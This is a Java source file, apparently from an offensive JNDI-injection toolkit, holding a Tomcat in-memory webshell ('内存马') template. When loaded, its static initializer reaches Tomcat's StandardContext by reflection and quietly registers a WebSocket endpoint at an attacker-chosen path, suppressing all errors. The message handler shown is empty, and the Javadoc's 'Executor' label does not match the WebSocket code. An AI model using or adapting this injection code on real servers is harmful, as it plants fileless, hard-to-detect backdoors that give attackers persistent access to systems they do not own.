package com.qi4l.jndi.template.memshell.tomcat;

import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;
import java.lang.reflect.Field;

/**
 * Executor 内存马
 *
 * @author QI4L
 */
public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<String> {

    public static String pattern;

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext       standardContext;

            try {
                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            } catch (Exception ignored) {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                Object root   = field.get(webappClassLoaderBase);
                Field  field2 = root.getClass().getDeclaredField("context");
                field2.setAccessible(true);

                standardContext = (StandardContext) field2.get(root);
            }

            ServerEndpointConfig build     = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, pattern).build();
            WsServerContainer    attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
            attribute.addEndpoint(build);
            standardContext.getServletContext().setAttribute(pattern, pattern);
        } catch (Exception ignored) {
        }
    }

    public Session session;

    public void onMessage(String message) {
    }


    @Override
    public void onOpen(Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }
}
